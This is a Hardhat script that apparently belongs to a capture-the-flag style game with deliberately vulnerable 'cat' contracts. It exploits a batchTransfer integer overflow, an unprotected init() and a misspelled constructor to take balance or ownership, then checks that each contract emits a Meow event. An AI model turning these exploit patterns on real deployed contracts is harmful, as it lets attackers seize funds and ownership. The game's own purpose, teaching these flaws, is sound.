const { ethers, network } = require("hardhat");
const fs = require("fs");
const path = require("path");

// Feeds the v4 cats so each lets out a Meow, mirroring website/functions/api/caress.js exactly,
// and asserts the Meow event landed. Reads addresses from deployment-<network>.json.
//   cat 2 OverflowCat   : batchTransfer overflow grants balance -> caress()
//   cat 3 UnprotectedCat: unprotected init() claims ownership   -> caress()
//   cat 4 MisspelledCat : misspelled "constructor" claims owner -> caress()
const MEOW_TOPIC = ethers.id("Meow(address,string)");
const DEAD = "0x000000000000000000000000000000000000dEaD";

const meowed = (receipt) => receipt.logs.some((l) => l.topics[0] === MEOW_TOPIC);

async function main() {
  const file = path.join(__dirname, "..", `deployment-${network.name}.json`);
  const addr = JSON.parse(fs.readFileSync(file, "utf8"));
  const [signer] = await ethers.getSigners();
  console.log(`Feeding v4 cats on ${network.name} as ${signer.address}\n`);

  // --- cat 2: OverflowCat ---
  const overflow = await ethers.getContractAt("OverflowCat", addr.OverflowCat);
  console.log("cat 2 OverflowCat: batchTransfer(overflow) -> caress()");
  await (await overflow.batchTransfer([signer.address, DEAD], 2n ** 255n)).wait();
  let rc = await (await overflow.caress()).wait();
  console.log(`  tx ${rc.hash}  Meow=${meowed(rc)}`);
  if (!meowed(rc)) throw new Error("OverflowCat did not Meow");

  // --- cat 3: UnprotectedCat ---
  const unprotected = await ethers.getContractAt("UnprotectedCat", addr.UnprotectedCat);
  console.log("cat 3 UnprotectedCat: init(signer) -> caress()");
  await (await unprotected.init(signer.address)).wait();
  rc = await (await unprotected.caress()).wait();
  console.log(`  tx ${rc.hash}  Meow=${meowed(rc)}`);
  if (!meowed(rc)) throw new Error("UnprotectedCat did not Meow");

  // --- cat 4: MisspelledCat (the misspelled "MisspeledCat" is a plain function, not a ctor) ---
  const misspelled = await ethers.getContractAt("MisspelledCat", addr.MisspelledCat);
  console.log("cat 4 MisspelledCat: MisspeledCat(signer) -> caress()");
  await (await misspelled.MisspeledCat(signer.address)).wait();
  rc = await (await misspelled.caress()).wait();
  console.log(`  tx ${rc.hash}  Meow=${meowed(rc)}`);
  if (!meowed(rc)) throw new Error("MisspelledCat did not Meow");

  console.log("\n✅ v4 cats fed (OverflowCat, UnprotectedCat, MisspelledCat).");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
